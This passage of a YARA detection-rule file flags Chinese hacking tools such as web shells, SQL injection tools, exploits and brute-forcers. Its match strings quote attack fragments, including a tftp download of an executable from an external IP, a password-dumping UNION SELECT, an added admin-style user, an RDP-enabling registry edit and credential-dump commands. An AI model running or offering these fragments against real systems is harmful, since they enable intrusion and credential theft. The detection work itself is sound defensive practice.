\"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_sig_3389_3389_3\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"echo \\\"fDenyTSConnections\\\"=dword:00000000>>3389.reg \" fullword ascii\n        $s2 = \"echo \\\"PortNumber\\\"=dword:00000d3d>>3389.reg \" fullword ascii\n        $s3 = \"echo [HKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Terminal Server]>>\" ascii\n\n    condition:\n        filesize < 2KB and all of them\n}\n\nrule ChineseHacktools_Alien_D\n{\n    meta:\n        description = \"Chinese hacktool (file: D.ASP)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Alien_D\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Paths_str=\\\"c:\\\\windows\\\\\\\"&chr(13)&chr(10)&\\\"c:\\\\Documents and Settings\\\\\\\"&chr\" ascii\n        $s1 = \"CONST_FSO=\\\"Script\\\"&\\\"ing.Fil\\\"&\\\"eSyst\\\"&\\\"emObject\\\"\" fullword ascii\n        $s2 = \"Response.Write \\\"<form id='form1' name='form1' method='post' action=''>\\\"\" fullword ascii\n        $s3 = \"set getAtt=FSO.GetFile(filepath)\" fullword ascii\n        $s4 = \"Response.Write \\\"<input name='NoCheckTemp' type='checkbox' id='NoCheckTemp' chec\" ascii\n\n    condition:\n        filesize < 30KB and 2 of them\n}\n\nrule ChineseHacktools_ChinaChopper_db\n{\n    meta:\n        description = \"Chinese hacktool (file: db.mdb)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_ChinaChopper_db\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"http://www.maicaidao.com/server.phpcaidao\" fullword wide\n        $s2 = \"<O>act=login</O>\" fullword wide\n        $s3 = \"<H>localhost</H>\" fullword wide\n\n    condition:\n        filesize < 340KB and 2 of them\n}\n\nrule ChineseHacktools_syconfig\n{\n    meta:\n        description = \"Chinese hacktool (file: syconfig.dll)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_syconfig\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s9 = \"Hashq.CrackHost+FormUnit\" fullword ascii\n\n    condition:\n        uint16(0) == 0x0100 and filesize < 18KB and all of them\n}\n\nrule ChineseHacktools_linux_bin\n{\n    meta:\n        description = \"Chinese hacktool (file: linux_bin)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_linux_bin\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"client.sin_port = htons(atoi(argv[3]));\" fullword ascii\n        $s2 = \"printf(\\\"\\\\n\\\\n*********Waiting Client connect*****\\\\n\\\\n\\\");\" fullword ascii\n\n    condition:\n        filesize < 20KB and all of them\n}\n\nrule ChineseHacktools_Intersect2_Beta\n{\n    meta:\n        description = \"Chinese hacktool (file: Intersect2-Beta.py)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Intersect2_Beta\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"os.system(\\\"ls -alhR /home > AllUsers.txt\\\")\" fullword ascii\n        $s2 = \"os.system('getent passwd > passwd.txt')\" fullword ascii\n        $s3 = \"os.system(\\\"rm -rf credentials/\\\")\" fullword ascii\n\n    condition:\n        uint16(0) == 0x2123 and filesize < 50KB and 2 of them\n}\n\nrule ChineseHacktools_IIS_logcleaner1_0_readme\n{\n    meta:\n        description = \"Chinese hacktool (file: readme.txt)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_IIS_logcleaner1_0_readme\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"LogCleaner.exe <ip> [Logpath]\" fullword ascii\n        $s3 = \"http://l-y.vicp.net\" fullword ascii\n\n    condition:\n        filesize < 7KB and all of them\n}\n\nrule ChineseHacktools_Alien_command\n{\n    meta:\n        description = \"Chinese hacktool (file: command.txt)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Alien_command\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"for /d %i in (E:\\\\freehost\\\\*) do @echo %i\" fullword ascii\n        $s1 = \"/c \\\"C:\\\\windows\\\\temp\\\\cscript\\\" C:\\\\windows\\\\temp\\\\iis.vbs\" fullword ascii\n\n    condition:\n        filesize < 8KB and all of them\n}\n\nrule ChineseHacktools_portRecall_bc\n{\n    meta:\n        description = \"Chinese hacktool (file: bc.pl)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_portRecall_bc\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"print \\\"[*] Connected to remote host \\\\n\\\"; \" fullword ascii\n        $s1 = \"print \\\"Usage: $0 [Host] [Port] \\\\n\\\\n\\\";  \" fullword ascii\n        $s5 = \"print \\\"[*] Resolving HostName\\\\n\\\"; \" fullword ascii\n\n    condition:\n        filesize < 10KB and all of them\n}\n\nrule ChineseHacktools_Tuoku_script_MSSQL_\n{\n    meta:\n        description = \"Chinese hacktool (file: MSSQL_.asp)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Tuoku_script_MSSQL_\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"GetLoginCookie = Request.Cookies(Cookie_Login)\" fullword ascii\n        $s2 = \"if ShellPath=\\\"\\\" Then ShellPath = \\\"c:\\\\\\\\windows\\\\\\\\system32\\\\\\\\cmd.exe\\\"\" fullword ascii\n        $s8 = \"Set DD=CM.exec(ShellPath&\\\" /c \\\"&DefCmd)\" fullword ascii\n\n    condition:\n        filesize < 100KB and all of them\n}\n\nrule ChineseHacktools_nc_MOVE\n{\n    meta:\n        description = \"Chinese hacktool (file: MOVE.txt)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_nc_MOVE\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Destination: http://202.113.20.235/gj/images/2.asp\" fullword ascii\n        $s1 = \"HOST: 202.113.20.235\" fullword ascii\n        $s2 = \"MOVE /gj/images/A.txt HTTP/1.1\" fullword ascii\n\n    condition:\n        filesize < 1KB and all of them\n}\n\nrule ChineseHacktools_mssqlpw_scan\n{\n    meta:\n        description = \"Chinese hacktool (file: mssqlpw scan.txt)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_mssqlpw_scan\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"response.Write(\\\"I Get it ! Password is <font color=red>\\\" & str & \\\"</font><BR>\" ascii\n        $s1 = \"response.Write \\\"Done!<br>Process \\\" & tTime & \\\" s\\\"\" fullword ascii\n\n    condition:\n        filesize < 6KB and all of them\n}\n\nrule ChineseHacktools_MAC_IPMAC\n{\n    meta:\n        description = \"Chinese hacktool (file: IPMAC.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_MAC_IPMAC\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Http://Www.YrYz.Net\" fullword wide\n        $s2 = \"IpMac.txt\" fullword ascii\n        $s3 = \"192.168.0.1\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 267KB and all of them\n}\n\nrule ChineseHacktools_GetSyskey\n{\n    meta:\n        description = \"Chinese hacktool (file: GetSyskey.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_GetSyskey\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"GetSyskey <SYSTEM registry file> [Output system key file]\" fullword ascii\n        $s4 = \"The system key file \\\"%s\\\" is created.\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 40KB and all of them\n}\n\nrule ChineseHacktools_Churrasco\n{\n    meta:\n        description = \"Chinese hacktool (file: Churrasco.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Churrasco\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"HEAD9 /\" ascii\n        $s1 = \"logic_er\" fullword ascii\n        $s6 = \"proggam\" fullword ascii\n        $s16 = \"DtcGetTransactionManagerExA\" fullword ascii\n        $s17 = \"GetUserNameA\" fullword ascii\n        $s18 = \"OLEAUT\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 1276KB and all of them\n}\n\nrule ChineseHacktools_mysql_injectV1_1_Creak\n{\n    meta:\n        description = \"Chinese hacktool (file: mysql_injectV1.1_Creak.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_mysql_injectV1_1_Creak\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"1http://192.169.200.200:2217/mysql_inject.php?id=1\" fullword ascii\n        $s12 = \"OnGetPassword\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 5890KB and all of them\n}\n\nrule ChineseHacktools_ASP_wshell\n{\n    meta:\n        description = \"Chinese hacktool (file: wshell.txt)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_ASP_wshell\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"<%@ LANGUAGE = VBScript.Encode %><%\" fullword ascii\n        $s1 = \"UserPass=\"\n        $s2 = \"VerName=\"\n        $s3 = \"StateName=\"\n\n    condition:\n        uint16(0) == 0x253c and filesize < 200KB and all of them\n}\n\nrule ChineseHacktools_exp_iis7\n{\n    meta:\n        description = \"Chinese hacktool (file: iis7.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_exp_iis7\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"\\\\\\\\localhost\" fullword ascii\n        $s1 = \"iis.run\" fullword ascii\n        $s3 = \">Could not connecto %s\" fullword ascii\n        $s4 = \"WinSta0\\\\Default\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 60KB and all of them\n}\n\nrule ChineseHacktools_SegmentWeapon\n{\n    meta:\n        description = \"Chinese hacktool (file: SegmentWeapon.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_SegmentWeapon\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"C:\\\\WINDOWS\\\\system32\\\\msvbvm60.dll\\\\3\" fullword ascii\n        $s1 = \"http://www.nforange.com/inc/1.asp?\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 100KB and all of them\n}\n\nrule ChineseHacktools_Alien_iispwd\n{\n    meta:\n        description = \"Chinese hacktool (file: iispwd.vbs)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Alien_iispwd\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"set IIs=objservice.GetObject(\\\"IIsWebServer\\\",childObjectName)\" fullword ascii\n        $s1 = \"wscript.echo \\\"from : http://www.xxx.com/\\\" &vbTab&vbCrLf\" fullword ascii\n\n    condition:\n        filesize < 3KB and all of them\n}\n\nrule ChineseHacktools_Md5CrackTools\n{\n    meta:\n        description = \"Chinese hacktool (file: Md5CrackTools.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Md5CrackTools\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)\" fullword ascii\n        $s2 = \",<a href='index.php?c=1&type=md5&hash=\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 4580KB and all of them\n}\n\nrule ChineseHacktools_CoolScan_scan\n{\n    meta:\n        description = \"Chinese hacktool (file: scan.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_CoolScan_scan\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"User-agent:\\\\s{0,32}(huasai|huasai/1.0|\\\\*)\" fullword ascii\n        $s1 = \"scan web.exe\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3680KB and all of them\n}\n\nrule ChineseHacktools_mempodipper2_6\n{\n    meta:\n        description = \"Chinese hacktool (file: mempodipper2.6.39)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_mempodipper2_6\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"objdump -d /bin/su|grep '<exit@plt>'|head -n 1|cut -d ' ' -f 1|sed\" ascii\n\n    condition:\n        filesize < 30KB and all of them\n}\n\nrule ChineseHacktools_COOKIE_CooKie\n{\n    meta:\n        description = \"Chinese hacktool (file: CooKie.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_COOKIE_CooKie\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s4 = \"-1 union select 1,username,password,4,5,6,7,8,9,10 from admin\" fullword ascii\n        $s5 = \"CooKie.exe\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 360KB and all of them\n}\n\nrule ChineseHacktools_wwwscan_1_wwwscan\n{\n    meta:\n        description = \"Chinese hacktool (file: wwwscan.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_wwwscan_1_wwwscan\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"%s www.target.com -p 8080 -m 10 -t 16\" fullword ascii\n        $s3 = \"GET /nothisexistpage.html HTTP/1.1\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 180KB and all of them\n}\n\nrule ChineseHacktools_D_injection_V2_32\n{\n    meta:\n        description = \"Chinese hacktool (file: D_injection_V2.32.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_D_injection_V2_32\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"Missing %s property(CommandText does not return a result set{Error creating obje\" wide\n        $s1 = \"/tftp -i 219.134.46.245 get 9493.exe c:\\\\9394.exe\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 5000KB and all of them\n}\n\nrule ChineseHacktools_net_priv_esc2\n{\n    meta:\n        description = \"Chinese hacktool (file: net-priv-esc2.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_net_priv_esc2\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"Usage:%s username password\" fullword ascii\n        $s2 = \"<www.darkst.com>\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 17KB and all of them\n}\n\nrule ChineseHacktools_Oracle_v1_0_Oracle\n{\n    meta:\n        description = \"Chinese hacktool (file: Oracle.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Oracle_v1_0_Oracle\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"!http://localhost/index.asp?id=zhr\" fullword ascii\n        $s2 = \"OnGetPassword\" fullword ascii\n        $s3 = \"Mozilla/3.0 (compatible; Indy Library)\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3455KB and all of them\n}\n\nrule ChineseHacktools_Interception\n{\n    meta:\n        description = \"Chinese hacktool (file: Interception.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Interception\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \".\\\\dat\\\\Hookmsgina.dll\" fullword ascii\n        $s5 = \"WinlogonHackEx \" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 160KB and all of them\n}\n\nrule ChineseHacktools_sig_3389_DUBrute_v3_0_RC3_3_0\n{\n    meta:\n        description = \"Chinese hacktool (file: 3.0.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_sig_3389_DUBrute_v3_0_RC3_3_0\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"explorer.exe http://bbs.yesmybi.net\" fullword ascii\n        $s1 = \"LOADER ERROR\" fullword ascii\n        $s9 = \"CryptGenRandom\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 395KB and all of them\n}\n\nrule ChineseHacktools_windows_exp\n{\n    meta:\n        description = \"Chinese hacktool (file: exp.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_windows_exp\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"c:\\\\windows\\\\system32\\\\command.com /c \" fullword ascii\n        $s8 = \"OH,Sry.Too long command.\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 220KB and all of them\n}\n\nrule ChineseHacktools_safe3wvs_cgiscan\n{\n    meta:\n        description = \"Chinese hacktool (file: cgiscan.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_safe3wvs_cgiscan\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s2 = \"httpclient.exe\" fullword wide\n        $s3 = \"www.safe3.com.cn\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 357KB and all of them\n}\n\nrule ChineseHacktools_pr_debug\n{\n    meta:\n        description = \"Chinese hacktool (file: debug.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_pr_debug\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"-->Got WMI process Pid: %d \" ascii\n        $s2 = \"This exploit will execute \\\"net user temp 123456 /add & net localg\" ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 820KB and all of them\n}\n\nrule ChineseHacktools_T00ls_Lpk_Sethc_v4_0\n{\n    meta:\n        description = \"Chinese hacktool (file: T00ls Lpk Sethc v4.0.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_T00ls_Lpk_Sethc_v4_0\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"LOADER ERROR\" fullword ascii\n        $s15 = \"2011-2012 T00LS&RICES\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 2077KB and all of them\n}\n\nrule ChineseHacktools_MatriXay1073\n{\n    meta:\n        description = \"Chinese hacktool (file: MatriXay1073.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_MatriXay1073\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s0 = \"User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; .NET CLR 1.1\" ascii\n        $s1 = \"Policy\\\\Scan\\\\GetUserLen.ini\" fullword ascii\n        $s2 = \"!YEL!Using http://127.0.0.1:%d/ to visiter https://%s:%d/\" fullword ascii\n        $s3 = \"getalluserpasswordhash\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 9100KB and all of them\n}\n\nrule ChineseHacktools_Sword1_5_\n{\n    meta:\n        description = \"Chinese hacktool (file: Sword1.5.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Sword1_5\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"http://www.md5.com.cn\" fullword wide\n        $s2 = \"ListBox_Command\" fullword wide\n        $s3 = \"\\\\Set.ini\" fullword wide\n        $s4 = \"OpenFileDialog1\" fullword wide\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 740KB and all of them\n}\n\nrule ChineseHacktools_Havij_Havij\n{\n    meta:\n        description = \"Chinese hacktool (file: Havij.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Neo23x0/signature-base\"\n        original_name = \"CN_Honker_Havij_Havij\"\n        license = \"GPL-3.0 (https://opensource.org/licenses/GPL-3.0)\"\n\n    strings:\n        $s1 = \"User-Agent: %Inject_Here%\" fullword wide\n        $s2 = \"BACKUP database master to disk='d:\\\\Inetpub\\\\wwwroot\\\\1.zip'\" fullword ascii\n\n    condition:\n        uint16(0) == 0x5a4d and filesize < 3000KB and all of them\n}\n\nrule ChineseHacktools_exp_ms11011\n{\n    meta:\n        description = \"Chinese hacktool (file: ms11011.exe)\"\n        classifications = \"Hacktool\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source 